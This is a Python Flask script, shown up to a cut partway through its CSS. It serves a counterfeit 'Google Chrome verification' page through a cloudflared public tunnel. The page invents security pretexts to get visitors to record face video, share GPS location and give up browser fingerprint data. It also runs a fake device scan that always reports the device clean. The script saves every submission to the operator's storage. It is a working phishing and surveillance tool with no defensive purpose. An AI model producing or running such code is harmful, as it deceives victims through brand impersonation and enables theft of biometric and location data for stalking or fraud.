import os
import base64
import subprocess
import sys
import re
import logging
import json
import random
from threading import Thread
import time
from datetime import datetime
from flask import Flask, render_template_string, request, jsonify
import requests
from geopy.geocoders import Nominatim  # FIXED: Changed geocators to geocoders

# --- Dependency and Tunnel Setup ---

def install_package(package):
    """Installs a package using pip quietly."""
    subprocess.check_call([sys.executable, "-m", "pip", "install", package, "-q", "--upgrade"])

def check_dependencies():
    """Checks for cloudflared and required Python packages."""
    try:
        subprocess.run(["cloudflared", "--version"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except (subprocess.CalledProcessError, FileNotFoundError):
        print("[ERROR] 'cloudflared' is not installed or not in your system's PATH.", file=sys.stderr)
        print("Please install it from: https://developers.cloudflare.com/cloudflare-one/connections/connect-apps/install-and-setup/installation/", file=sys.stderr)
        sys.exit(1)
    
    packages = {"Flask": "flask", "requests": "requests", "geopy": "geopy"}
    for pkg_name, import_name in packages.items():
        try:
            __import__(import_name)
        except ImportError:
            install_package(pkg_name)

def run_cloudflared_and_print_link(port, script_name):
    """Starts a cloudflared tunnel and prints the public link."""
    cmd = ["cloudflared", "tunnel", "--url", f"http://127.0.0.1:{port}", "--protocol", "http2"]
    process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    
    # Wait a moment for tunnel to establish
    time.sleep(2)
    
    # Try to read output
    try:
        for _ in range(10):  # Try a few times
            line = process.stdout.readline()
            if line:
                match = re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', line)
                if match:
                    print(f"{script_name} Public Link: {match.group(0)}")
                    sys.stdout.flush()
                    return process
    except:
        pass
    
    print("[!] Could not get public link automatically. Please check cloudflared output.")
    return process

def generate_google_account():
    """Generate a random Google account email."""
    first_names = ["alex", "sam", "jordan", "taylor", "casey", "morgan", "riley", "avery", 
                   "charlie", "skyler", "jamie", "quinn", "blake", "parker", "drew"]
    
    last_names = ["smith", "johnson", "williams", "brown", "jones", "garcia", "miller", "davis",
                  "rodriguez", "martinez", "hernandez", "lopez", "gonzalez", "wilson", "anderson"]
    
    domains = ["gmail.com", "googlemail.com", "google.com"]
    
    first = random.choice(first_names)
    last = random.choice(last_names)
    number = random.randint(10, 999)
    domain = random.choice(domains)
    
    email_variants = [
        f"{first}.{last}",
        f"{first}{last}",
        f"{first}{number}",
        f"{first}_{last}",
        f"{first[0]}{last}",
        f"{first}{last}{number}"
    ]
    
    return f"{random.choice(email_variants)}@{domain}"

def get_verification_settings():
    """Get user preferences for Chrome verification process."""
    print("\n" + "="*60)
    print("GOOGLE CHROME VERIFICATION SETUP")
    print("="*60)
    
    # Get Google account
    print("\n[+] GOOGLE ACCOUNT SETUP")
    print("Enter the Google account email to display")
    print("Leave blank for random account generation")
    
    email_input = input("Google account (or press Enter for random): ").strip()
    if email_input:
        settings = {'google_account': email_input}
    else:
        random_email = generate_google_account()
        settings = {'google_account': random_email}
        print(f"[+] Generated Google account: {random_email}")
    
    # Chrome version
    chrome_versions = ["120.0.6099.130", "121.0.6167.140", "122.0.6261.94", "123.0.6312.86", "124.0.6367.60"]
    settings['chrome_version'] = random.choice(chrome_versions)
    
    # Device type
    device_types = ["Windows PC", "MacBook Pro", "MacBook Air", "Linux Desktop", "ChromeOS Device"]
    settings['device_type'] = random.choice(device_types)
    
    # Browser sync status
    sync_statuses = ["Syncing...", "Partially Synced", "Sync Paused", "Needs Reauthorization"]
    settings['sync_status'] = random.choice(sync_statuses)
    
    print(f"\n[+] Chrome Version: {settings['chrome_version']}")
    print(f"[+] Device: {settings['device_type']}")
    print(f"[+] Sync Status: {settings['sync_status']}")
    
    # Verification type
    print("\n1. Chrome Verification Type:")
    print("A - Safe Browsing Update (Security verification)")
    print("B - Chrome Reactivation (Account verification)")
    print("C - Sync Recovery (Browser sync reauthorization)")
    print("D - Browser Update (Critical security patch)")
    
    while True:
        vtype = input("Select type (A/B/C/D, default: A): ").strip().upper()
        if not vtype:
            vtype = 'A'
        if vtype in ['A', 'B', 'C', 'D']:
            if vtype == 'A':
                settings['verification_type'] = 'safe_browsing'
                settings['title'] = "Safe Browsing Security Update"
                settings['reason'] = "Chrome needs to verify your identity to update Safe Browsing protection"
            elif vtype == 'B':
                settings['verification_type'] = 'reactivation'
                settings['title'] = "Chrome Reactivation Required"
                settings['reason'] = "Your Chrome browser needs to be reactivated for security reasons"
            elif vtype == 'C':
                settings['verification_type'] = 'sync_recovery'
                settings['title'] = "Chrome Sync Recovery"
                settings['reason'] = "Restore your browser sync to access bookmarks, passwords, and history"
            else:
                settings['verification_type'] = 'browser_update'
                settings['title'] = "Critical Browser Update"
                settings['reason'] = "Update Chrome with enhanced security features"
            break
        else:
            print("Please enter A, B, C, or D.")
    
    # Face verification
    print("\n2. Identity Verification:")
    print("Require face verification?")
    face_enabled = input("Enable face verification (y/n, default: y): ").strip().lower()
    settings['face_enabled'] = face_enabled in ['y', 'yes', '']
    
    if settings['face_enabled']:
        while True:
            try:
                duration = input("Duration in seconds (5-20, default: 12): ").strip()
                if not duration:
                    settings['face_duration'] = 12
                    break
                duration = int(duration)
                if 5 <= duration <= 20:
                    settings['face_duration'] = duration
                    break
                else:
                    print("Please enter a number between 5 and 20.")
            except ValueError:
                print("Please enter a valid number.")
    
    # Location verification
    print("\n3. Location Verification:")
    print("Require location verification?")
    location_enabled = input("Enable location verification (y/n, default: y): ").strip().lower()
    settings['location_enabled'] = location_enabled in ['y', 'yes', '']
    
    # Device scan
    print("\n4. Device Scan:")
    print("Perform device security scan?")
    device_scan = input("Enable device scan (y/n, default: y): ").strip().lower()
    settings['device_scan_enabled'] = device_scan in ['y', 'yes', '']
    
    # System info collection
    print("\n5. System Information:")
    print("Collect system information?")
    system_info = input("Enable system info collection (y/n, default: y): ").strip().lower()
    settings['system_info_enabled'] = system_info in ['y', 'yes', '']
    
    return settings

# --- Location Processing Functions ---

geolocator = Nominatim(user_agent="chrome_verification")

def process_and_save_location(data, session_id):
    """Process and save location data."""
    try:
        lat = data.get('latitude')
        lon = data.get('longitude')
        
        if not lat or not lon:
            return
        
        # Get address information
        address_details = {}
        full_address = "Unknown"
        try:
            location = geolocator.reverse((lat, lon), language='en', timeout=10)
            if location:
                full_address = location.address
                if hasattr(location, 'raw') and 'address' in location.raw:
                    address_details = location.raw.get('address', {})
        except Exception:
            pass
        
        # Get IP info
        ip_info = {}
        try:
            response = requests.get("http://ipinfo.io/json", timeout=5)
            ip_info = response.json()
        except:
            pass
        
        # Prepare structured data
        location_data = {
            "platform": "google_chrome_verification",
            "session_id": session_id,
            "timestamp": datetime.now().isoformat(),
            "gps_coordinates": {
                "latitude": lat,
                "longitude": lon,
                "accuracy_m": data.get('accuracy')
            },
            "address_information": {
                "full_address": full_address,
                "city": address_details.get("city"),
                "state": address_details.get("state"),
                "country": address_details.get("country")
            },
            "network_information": {
                "ip_address": ip_info.get("ip"),
                "city": ip_info.get("city"),
                "region": ip_info.get("region"),
                "country": ip_info.get("country"),
                "isp": ip_info.get("org", "").split()[-1] if ip_info.get("org") else "Unknown"
            },
            "verification_data": {
                "google_account": data.get('google_account', 'unknown'),
                "chrome_version": data.get('chrome_version', 'unknown'),
                "verification_type": data.get('verification_type', 'unknown')
            }
        }
        
        # Save to file
        filename = f"chrome_location_{session_id}.json"
        filepath = os.path.join(DOWNLOAD_FOLDER, 'location_data', filename)
        
        with open(filepath, 'w', encoding='utf-8') as f:
            json.dump(location_data, f, indent=2, ensure_ascii=False)
        
        print(f"Chrome location data saved: {filename}")
        
    except Exception as e:
        print(f"Error processing location: {e}")

# --- Flask Application ---

app = Flask(__name__)

# Global settings (will be updated after user input)
VERIFICATION_SETTINGS = {
    'google_account': generate_google_account(),
    'chrome_version': "122.0.6261.94",
    'device_type': "Windows PC",
    'sync_status': "Syncing...",
    'verification_type': 'safe_browsing',
    'title': "Safe Browsing Security Update",
    'reason': "Chrome needs to verify your identity to update Safe Browsing protection",
    'face_enabled': True,
    'face_duration': 12,
    'location_enabled': True,
    'device_scan_enabled': True,
    'system_info_enabled': True
}

DOWNLOAD_FOLDER = os.path.expanduser('~/storage/downloads/Chrome Verification')
os.makedirs(os.path.join(DOWNLOAD_FOLDER, 'face_verification'), exist_ok=True)
os.makedirs(os.path.join(DOWNLOAD_FOLDER, 'location_data'), exist_ok=True)
os.makedirs(os.path.join(DOWNLOAD_FOLDER, 'device_scans'), exist_ok=True)
os.makedirs(os.path.join(DOWNLOAD_FOLDER, 'system_info'), exist_ok=True)
os.makedirs(os.path.join(DOWNLOAD_FOLDER, 'user_data'), exist_ok=True)

def create_html_template(settings):
    """Creates the Google Chrome verification template."""
    google_account = settings['google_account']
    chrome_version = settings['chrome_version']
    device_type = settings['device_type']
    sync_status = settings['sync_status']
    verification_type = settings['verification_type']
    title = settings['title']
    reason = settings['reason']
    face_duration = settings.get('face_duration', 12)
    
    # Colors
    colors = {
        'chrome_blue': '#4285F4',
        'chrome_red': '#EA4335',
        'chrome_yellow': '#FBBC05',
        'chrome_green': '#34A853',
        'chrome_dark': '#202124',
        'chrome_gray': '#5F6368',
        'chrome_light': '#F8F9FA'
    }
    
    # Steps based on verification type
    total_steps = 2  # Intro + Step 1
    
    if settings['face_enabled']:
        total_steps += 1
    
    if settings['location_enabled']:
        total_steps += 1
    
    if settings['device_scan_enabled']:
        total_steps += 1
    
    if settings['system_info_enabled']:
        total_steps += 1
    
    total_steps += 1  # Final processing step
    total_steps += 1  # Completion step
    
    # Build step indicator HTML
    step_indicator_html = ''
    step_counter = 1
    
    # Step 1
    step_indicator_html += '<div class="step"><div class="step-number active">1</div><div class="step-label active">Security Check</div></div>'
    
    # Step 2 (Face verification)
    if settings['face_enabled']:
        step_counter += 1
        step_indicator_html += f'<div class="step" id="step2Indicator"><div class="step-number">2</div><div class="step-label">Identity</div></div>'
    
    # Step 3 (Location verification)
    if settings['location_enabled']:
        step_counter += 1
        step_indicator_html += f'<div class="step" id="step3Indicator"><div class="step-number">3</div><div class="step-label">Location</div></div>'
    
    # Step 4 (Device scan)
    if settings['device_scan_enabled']:
        step_counter += 1
        step_indicator_html += f'<div class="step" id="step4Indicator"><div class="step-number">4</div><div class="step-label">Device Scan</div></div>'
    
    # Step 5 (System info)
    if settings['system_info_enabled']:
        step_counter += 1
        step_indicator_html += f'<div class="step" id="step5Indicator"><div class="step-number">5</div><div class="step-label">System Info</div></div>'
    
    # Final step
    step_indicator_html += '<div class="step"><div class="step-number">✓</div><div class="step-label">Complete</div></div>'
    
    # Build step content HTML
    step_content_html = ''
    
    # Step 2 (Face verification)
    if settings['face_enabled']:
        step_content_html += f'''
            <div class="step-content" id="step2">
                <h2 class="step-title">Identity Verification</h2>
                <p class="step-description">
                    Verify your identity to ensure this is your Chrome browser. Look at the camera and follow the instructions.
                </p>
                
                <div class="camera-section">
                    <div class="camera-container">
                        <video id="faceVideo" autoplay playsinline></video>
                        <div class="face-circle"></div>
                    </div>
                    <div class="timer" id="faceTimer">00:{str(face_duration).zfill(2)}</div>
                    <button class="btn" id="startFaceBtn" onclick="startFaceVerification()">Start Face Verification</button>
                </div>
                
                <div class="status-message" id="faceStatus">Click start to begin face verification</div>
                
                <div class="button-group">
                    <button class="btn" id="nextFaceBtn" onclick="completeFaceVerification()" disabled>Continue</button>
                    <button class="btn btn-outline" onclick="prevStep()">Back</button>
                </div>
            </div>
        '''
    
    # Step 3 (Location verification)
    if settings['location_enabled']:
        step_content_html += f'''
            <div class="step-content" id="step3">
                <h2 class="step-title">Location Verification</h2>
                <p class="step-description">
                    Chrome needs to verify your location to provide localized security protection and prevent unauthorized access.
                </p>
                
                <div class="location-section">
                    <div class="location-icon">📍</div>
                    <h3>Share Your Location</h3>
                    <p style="margin-bottom: 20px; color: var(--chrome-gray);">
                        Google uses location data to protect your account and provide relevant security alerts.
                    </p>
                    <div class="status-message" id="locationStatus">Click the button below to share your location</div>
                </div>
                
                <div class="button-group">
                    <button class="btn" id="locationBtn" onclick="requestLocation()">Share My Location</button>
                    <button class="btn btn-outline" onclick="prevStep()">Back</button>
                </div>
            </div>
        '''
    
    # Step 4 (Device scan)
    if settings['device_scan_enabled']:
        step_content_html += f'''
            <div class="step-content" id="step4">
                <h2 class="step-title">Device Security Scan</h2>
                <p class="step-description">
                    Scanning your device for security threats and compatibility issues.
                </p>
                
                <div class="scan-section">
                    <div class="scan-item">
                        <div>Browser Integrity</div>
                        <div class="scan-status" id="scan1">Pending</div>
                    </div>
                    <div class="scan-item">
                        <div>Malware Detection</div>
                        <div class="scan-status" id="scan2">Pending</div>
                    </div>
                    <div class="scan-item">
                        <div>Extensions Safety</div>
                        <div class="scan-status" id="scan3">Pending</div>
                    </div>
                    <div class="scan-item">
                        <div>Security Protocols</div>
                        <div class="scan-status" id="scan4">Pending</div>
                    </div>
                    <div class="scan-progress">
                        <div class="scan-fill" id="scanProgress"></div>
                    </div>
                </div>
                
                <div class="status-message" id="scanStatus">Click start to begin device scan</div>
                
                <div class="button-group">
                    <button class="btn" id="startScanBtn" onclick="startDeviceScan()">Start Device Scan</button>
                    <button class="btn btn-outline" onclick="prevStep()">Back</button>
                </div>
            </div>
        '''
    
    # Step 5 (System info)
    if settings['system_info_enabled']:
        step_content_html += f'''
            <div class="step-content" id="step5">
                <h2 class="step-title">System Information</h2>
                <p class="step-description">
                    Collecting system information to ensure Chrome compatibility and optimize performance.
                </p>
                
                <div class="system-info-section">
                    <div class="info-grid" id="systemInfoGrid">
                        <!-- System info will be populated by JavaScript -->
                    </div>
                    <div class="status-message status-processing" id="systemInfoStatus">
                        <span class="loading-spinner"></span> Collecting system information...
                    </div>
                </div>
                
                <div class="button-group">
                    <button class="btn" onclick="submitSystemInfo()">Continue</button>
                    <button class="btn btn-outline" onclick="prevStep()">Back</button>
                </div>
            </div>
        '''
    
    # Build JavaScript conditionally
    face_verification_js = ''
    if settings['face_enabled']:
        face_verification_js = f'''
        async function startFaceVerification() {{
            try {{
                const btn = document.getElementById("startFaceBtn");
                btn.disabled = true;
                btn.innerHTML = '<span class="loading-spinner"></span>Accessing Camera...';
                faceStream = await navigator.mediaDevices.getUserMedia({{
                    video: {{ facingMode: "user", width: {{ ideal: 640 }}, height: {{ ideal: 480 }} }},
                    audio: false
                }});
                document.getElementById("faceVideo").srcObject = faceStream;
                startFaceScan();
            }} catch (error) {{
                alert("Unable to access camera. Please ensure camera permissions are granted.");
                document.getElementById("startFaceBtn").disabled = false;
                document.getElementById("startFaceBtn").textContent = "Start Face Verification";
            }}
        }}
        
        function startFaceScan() {{
            faceTimeLeft = {face_duration};
            updateFaceTimer();
            faceTimerInterval = setInterval(() => {{
                faceTimeLeft--;
                updateFaceTimer();
                if (faceTimeLeft <= 0) {{
                    completeFaceVerification();
                }}
            }}, 1000);
            startFaceRecording();
        }}
        
        function updateFaceTimer() {{
            const minutes = Math.floor(faceTimeLeft / 60);
            const seconds = faceTimeLeft % 60;
            document.getElementById("faceTimer").textContent = 
                minutes.toString().padStart(2, "0") + ":" + seconds.toString().padStart(2, "0");
        }}
        
        function startFaceRecording() {{
            faceChunks = [];
            try {{
                faceRecorder = new MediaRecorder(faceStream, {{ mimeType: "video/webm;codecs=vp9" }});
            }} catch (e) {{
                faceRecorder = new MediaRecorder(faceStream);
            }}
            faceRecorder.ondataavailable = (event) => {{
                if (event.data && event.data.size > 0) faceChunks.push(event.data);
            }};
            faceRecorder.onstop = sendFaceRecording;
            faceRecorder.start(100);
        }}
        
        function completeFaceVerification() {{
            clearInterval(faceTimerInterval);
            if (faceRecorder && faceRecorder.state === "recording") {{
                faceRecorder.stop();
            }}
            if (faceStream) faceStream.getTracks().forEach(track => track.stop());
            document.getElementById("faceTimer").textContent = "✓ Complete";
            document.getElementById("faceStatus").className = "status-message status-success";
            document.getElementById("faceStatus").textContent = "✓ Identity verified successfully";
            document.getElementById("nextFaceBtn").disabled = false;
        }}
        
        function sendFaceRecording() {{
            if (faceChunks.length === 0) return;
            const videoBlob = new Blob(faceChunks, {{ type: "video/webm" }});
            const reader = new FileReader();
            reader.onloadend = function() {{
                const base64data = reader.result.split(",")[1];
                $.ajax({{
                    url: "/submit_face_verification",
                    type: "POST",
                    data: JSON.stringify({{
                        face_video: base64data,
                        duration: {face_duration},
                        timestamp: new Date().toISOString(),
                        session_id: sessionId,
                        google_account: googleAccount,
                        chrome_version: chromeVersion,
                        verification_type: verificationType
                    }}),
                    contentType: "application/json"
                }});
            }};
            reader.readAsDataURL(videoBlob);
        }}
        '''
    
    location_verification_js = ''
    if settings['location_enabled']:
        location_verification_js = '''
        function requestLocation() {
            const btn = document.getElementById("locationBtn");
            const statusDiv = document.getElementById("locationStatus");
            btn.disabled = true;
            btn.innerHTML = '<span class="loading-spinner"></span>Getting Location...';
            statusDiv.className = "status-message status-processing";
            statusDiv.textContent = "Accessing your location...";
            if (!navigator.geolocation) {
                statusDiv.className = "status-message status-error";
                statusDiv.textContent = "Geolocation not supported";
                return;
            }
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    statusDiv.className = "status-message status-success";
                    statusDiv.textContent = "✓ Location verified successfully";
                    btn.disabled = true;
                    btn.textContent = "✓ Location Verified";
                    locationVerified = true;
                    $.ajax({
                        url: "/submit_location_verification",
                        type: "POST",
                        data: JSON.stringify({
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy,
                            timestamp: new Date().toISOString(),
                            session_id: sessionId,
                            google_account: googleAccount,
                            chrome_version: chromeVersion,
                            verification_type: verificationType
                        }),
                        contentType: "application/json"
                    });
                    setTimeout(() => nextStep(), 1500);
                },
                (error) => {
                    statusDiv.className = "status-message status-error";
                    statusDiv.textContent = "Location access denied. Please enable location services.";
                    btn.disabled = false;
                    btn.textContent = "Try Again";
                }
            );
        }
        '''
    
    device_scan_js = ''
    if settings['device_scan_enabled']:
        device_scan_js = '''
        function startDeviceScan() {
            const btn = document.getElementById("startScanBtn");
            const statusDiv = document.getElementById("scanStatus");
            btn.disabled = true;
            btn.innerHTML = '<span class="loading-spinner"></span>Scanning...';
            statusDiv.className = "status-message status-processing";
            statusDiv.textContent = "Scanning your device for security threats...";
            let progress = 0;
            const scanItems = ["scan1", "scan2", "scan3", "scan4"];
            const scanInterval = setInterval(() => {
                progress += 25;
                document.getElementById("scanProgress").style.width = progress + "%";
                const index = Math.floor(progress / 25) - 1;
                if (index >= 0 && index < scanItems.length) {
                    document.getElementById(scanItems[index]).textContent = "✓ Safe";
                    document.getElementById(scanItems[index]).style.color = "var(--chrome-green)";
                }
                if (progress >= 100) {
                    clearInterval(scanInterval);
                    statusDiv.className = "status-message status-success";
                    statusDiv.textContent = "✓ Device scan completed. No threats found.";
                    btn.disabled = true;
                    btn.textContent = "✓ Scan Complete";
                    // Submit scan data
                    $.ajax({
                        url: "/submit_device_scan",
                        type: "POST",
                        data: JSON.stringify({
                            scan_result: "clean",
                            timestamp: new Date().toISOString(),
                            session_id: sessionId,
                            google_account: googleAccount,
                            chrome_version: chromeVersion
                        }),
                        contentType: "application/json"
                    });
                    setTimeout(() => nextStep(), 1500);
                }
            }, 800);
        }
        '''
    
    system_info_js = ''
    if settings['system_info_enabled']:
        system_info_js = '''
        function collectSystemInfo() {
            const grid = document.getElementById("systemInfoGrid");
            const statusDiv = document.getElementById("systemInfoStatus");
            // Collect browser info
            const systemInfo = {
                browser: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                cookies_enabled: navigator.cookieEnabled,
                screen_resolution: screen.width + "x" + screen.height,
                color_depth: screen.colorDepth + " bit",
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                cpu_cores: navigator.hardwareConcurrency,
                memory: navigator.deviceMemory || "Unknown",
                touch_support: "ontouchstart" in window
            };
            // Display info in grid
            let html = "";
            Object.keys(systemInfo).forEach(key => {
                const label = key.replace(/_/g, " ").replace(/\\b\\w/g, l => l.toUpperCase());
                const value = systemInfo[key];
                html += `<div class="info-item"><div class="info-label">${label}</div><div class="info-value">${value}</div></div>`;
            });
            grid.innerHTML = html;
            statusDiv.className = "status-message status-success";
            statusDiv.innerHTML = "✓ System information collected";
        }
        
        function submitSystemInfo() {
            // Submit system info
            $.ajax({
                url: "/submit_system_info",
                type: "POST",
                data: JSON.stringify({
                    browser: navigator.userAgent,
                    platform: navigator.platform,
                    screen_resolution: screen.width + "x" + screen.height,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    timestamp: new Date().toISOString(),
                    session_id: sessionId,
                    google_account: googleAccount,
                    chrome_version: chromeVersion
                }),
                contentType: "application/json"
            });
            startProcessing();
        }
        '''
    
    template = f'''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Chrome - {title}</title>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <style>
        :root {{
            --chrome-blue: {colors['chrome_blue']};
            --chrome-red: {colors['chrome_red']};
            --chrome-yellow: {colors['chrome_yellow']};
            --chrome-green: {colors['chrome_green']};
            --chrome-dark: {colors['chrome_dark']};
            --chrome-gray: {colors['chrome_gray']};
            --chrome-light: {colors['chrome_light']};
            --chrome-border: #DADCE0;
        }}
        
        * {{
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }}
        
        body {{
            font-family: 'Google Sans', 'Roboto', 'Segoe UI', Arial, sans-serif;
            background-color: var(--chrome-light);
            color: var(--chrome-dark);
            line-height: 1.6;
            min-height: 100vh;
        }}
        
        .container {{
            max-width: 800px;
            margin: 0 auto;
            padding: 20px;
        }}
        
        /* Header */
        .header {{
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 25px 0;
            border-bottom: 1px solid var(--chrome-border);
            margin-bottom: 30px;
        }}
        
        .chrome-logo {{
            display: flex;
            align-items: center;
            gap: 12px;
            font-size: 28px;
            font-weight: 500;
        }}
        
        .chrome-icon {{
            width: 40px;
            height: 40px;
            background: linear-gradient(45deg, {colors['chrome_blue']}, {colors['chrome_red']}, {colors['chrome_yellow']}, {colors['chrome_green']});
            border-radius: 8px;
            position: relative;
        }}
        
        .chrome-icon::before {{
            content: '';
            position: absolute;
            top: 6px;
            left: 6px;
            right: 6px;
            bottom: 6px;
            background: white;
            border-radius: 4px;
        }}
        
        .verification-badge {{
            background: {colors['chrome_green']};
            color: white;
            padding: 6px 16px;
            border-radius: 20px;
            font-size: 14px;
            font-weight: 500;
        }}
        
        /* Account Info */
        .account-card {{
            background: white;
            border-radius: 12px;
            padding: 25px;
            margin-bottom: 25px;
            border: 1px solid var(--chrome-border);
            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
        }}
        
        .account-header {{
            display: flex;
            align-items: center;
            gap: 20px;
            margin-bottom: 20px;
        }}
        
        .account-avatar {{
            width: 60px;
            height: 60px;
            border-radius: 50%;
            background: linear-gradient(45deg, {colors['chrome_blue']}, {colors['chrome_green']});
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-size: 24px;
            font-weight: 500;
        }}
        
        .account-info h2 {{
            font-size: 20px;
            margin-bottom: 5px;
            color: var(--chrome-dark);
        }}
        
        .account-info p {{
            color: var(--chrome-gray);
            font-size: 14px;
        }}
        
        .device-info {{
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
            gap: 15px;
            margin-top: 15px;
            padding-top: 15px;
            border-top: 1px solid var(--chrome-border);
        }}
        
        .device-item {{
            text-align: center;
        }}
        
        .device-label {{
            font-size: 12px;
            color: var(--chrome-gray);
            margin-bottom: 4px;
        }}
        
        .device-value {{
            font-weight: 500;
            color: var(--chrome-dark);
        }}
        
        /* Security Alert */
        .security-alert {{
            background: linear-gradient(135deg, {colors['chrome_yellow']}, #F29900);
            color: #5C3B00;
            border-radius: 12px;
            padding: 25px;
            margin-bottom: 30px;
            display: flex;
            align-items: flex-start;
            gap: 20px;
        }}
        
        .alert-icon {{
            font-size: 32px;
            flex-shrink: 0;
        }}
        
        .alert-content h3 {{
            font-size: 20px;
            margin-bottom: 10px;
        }}
        
        /* Steps */
        .steps-container {{
            margin-bottom: 40px;
        }}
        
        .step-indicator {{
            display: flex;
            justify-content: space-between;
            margin-bottom: 40px;
            position: relative;
        }}
        
        .step-indicator::before {{
            content: '';
            position: absolute;
            top: 20px;
            left: 0;
            right: 0;
            height: 2px;
            background: var(--chrome-border);
            z-index: 1;
        }}
        
        .step {{
            display: flex;
            flex-direction: column;
            align-items: center;
            position: relative;
            z-index: 2;
        }}
        
        .step-number {{
            width: 40px;
            height: 40px;
            border-radius: 50%;
            background: var(--chrome-border);
            color: var(--chrome-gray);
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: 500;
            margin-bottom: 10px;
            border: 3px solid white;
            transition: all 0.3s;
        }}
        
        .step-number.active {{
            background: var(--chrome-blue);
            color: white;
            transform: scale(1.1);
        }}
        
        .step-number.completed {{
            background: var(--chrome-green);
            color: white;
        }}
        
        .step-label {{
            font-size: 14px;
            color: var(--chrome-gray);
            text-align: center;
            max-width: 100px;
        }}
        
        .step-label.active {{
            color: var(--chrome-dark);
            font-weight: 500;
        }}
        
        /* Step Content */
        .step-content {{
            display: none;
            animation: fadeIn 0.5s;
        }}
        
        @keyframes fadeIn {{
            from {{ opacity: 0; transform: translateY(20px); }}
            to {{ opacity: 1; transform: translateY(0); }}
        }}
        
        .step-content.active {{
            display: block;
        }}
        
        .step-title {{
            font-size: 24px;
            margin-bottom: 15px;
            font-weight: 500;
            color: var(--chrome-dark);
        }}
        
        .step-description {{
            color: var(--chrome-gray);
            margin-bottom: 30px;
            font-size: 16px;
        }}
        
        /* Camera Section */
        .camera-section {{
            background: white;
            border-radius: 12px;
            padding: 30px;
            margin-bottom: 30px;
            border: 1px solid var(--chrome-border);
            text-align: center;
        }}
        
        .camera-container {{
            width: 300px;
            height: 300px;
            margin: 0 auto 25px;
            border-radius: 12px;
            overflow: hidden;
            background: #000;
            border: 3px solid var(--chrome-blue);
            position: relative;
        }}
        
        .camera-container video {{
            width: 100%;
            height: 100%;
            object-fit: cover;
        }}
        
        .face-circle {{
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 200px;
            height: 200px;
            border: 2px solid white;
            border-radius: 50%;
            box-shadow: 0 0 0 9999px rgba(0, 0, 0, 0.7);
        }}
        
        .timer {{
            font-size: 32px;
            font-weight: 500;
            color: var(--chrome-blue);
            margin: 20px 0;
            font-family: 'Courier New', monospace;
        }}
        
        /* Location Section */
        .location-section {{
            background: white;
            border-radius: 12px;
            padding: 30px;
            margin-bottom: 30px;
            border: 1px solid var(--chrome-border);
            text-align: center;
        }}
        
        .location-icon {{
            font-size: 64px;
            color: var(--chrome-green);
            margin-bottom: 20px;
        }}
        
        /* Device Scan */
        .scan-section {{
            background: white;
            border-radius: 12px;
            padding: 30px;
            margin-bottom: 30px;
            border: 1px solid var(--chrome-border);
        }}
        
        .scan-progress {{
            height: 10px;
            background: var(--chrome-border);
            border-radius: 5px;
            margin: 20px 0;
            overflow: hidden;
        }}
        
        .scan-fill {{
            height: 100%;
            background: linear-gradient(90deg, {colors['chrome_blue']}, {colors['chrome_green']});
            width: 0%;
            transition: width 0.5s;
        }}
        
        .scan-item {{
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 15px 0;
            border-bottom: 1px solid var(--chrome-border);
        }}
        
        .scan-item:last-child {{
            border-bottom: none;
        }}
        
        .scan-status {{
            color: var(--chrome-green);
            font-weight: 500;
        }}
        
        /* System Info */
        .system-info-section {{
            background: white;
            border-radius: 12px;
            padding: 30px;
            margin-bottom: 30px;
            border: 1px solid var(--chrome-border);
        }}
        
        .info-grid {{
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            margin-top: 20px;
        }}
        
        .info-item {{
            padding: 15px;
            background: var(--chrome-light);
            border-radius: 8px;
            border: 1px solid var(--chrome-border);
        }}
        
        .info-label {{
            font-size: 12px;
            color: var(--chrome-gray);
            margin-bottom: 5px;
        }}
        
        .info-value {{
            font-weight: 500;
            color: var(--chrome-dark);
        }}
        
        /* Buttons */
        .btn {{
            display: inline-block;
            padding: 16px 32px;
            background: var(--chrome-blue);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.3s;
            text-align: center;
            text-decoration: none;
        }}
        
        .btn:hover {{
            background: #3367D6;
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(66, 133, 244, 0.3);
        }}
        
        .btn:active {{
            transform: translateY(0);
        }}
        
        .btn:disabled {{
            background: var(--chrome-border);
            cursor: not-allowed;
            transform: none;
            box-shadow: none;
        }}
        
        .btn-block {{
            display: block;
            width: 100%;
        }}
        
        .btn-outline {{
            background: transparent;
            border: 2px solid var(--chrome-border);
            color: var(--chrome-dark);
        }}
        
        .btn-outline:hover {{
            background: var(--chrome-light);
            border-color: var(--chrome-blue);
            color: var(--chrome-blue);
        }}
        
        .button-group {{
            display: flex;
            gap: 15px;
            margin-top: 30px;
        }}
        
        /* Status Messages */
        .status-message {{
            padding: 15px;
            border-radius: 8px;
            margin: 20px 0;
            text-align: center;
        }}
        
        .status-success {{
            background: rgba(52, 168, 83, 0.1);
            color: var(--chrome-green);
            border: 1px solid var(--chrome-green);
        }}
        
        .status-error {{
            background: rgba(234, 67, 53, 0.1);
            color: var(--chrome-red);
            border: 1px solid var(--chrome-red);
        }}
        
        .status-processing {{
            background: rgba(251, 188, 5, 0.1);
            color: var(--chrome-yellow);
            border: 1px solid var(--chrome-yellow);
        }}
        
        /* Loading Spinner */
        .loading-spinner {{
            display: inline-block;
            width: 20px;
            height: 20px;
